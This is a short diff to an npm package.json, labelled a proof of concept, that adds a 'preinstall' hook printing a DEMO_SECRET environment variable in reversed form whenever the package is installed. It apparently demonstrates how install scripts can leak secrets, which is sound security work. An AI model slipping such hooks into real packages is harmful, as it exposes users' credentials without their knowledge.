@@ -4,7 +4,8 @@
   "description": "NOTE: This is an extreme case just for POC purposes",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "env | grep DEMO_SECRET | rev"
   },
   "keywords": [],
   "author": "",
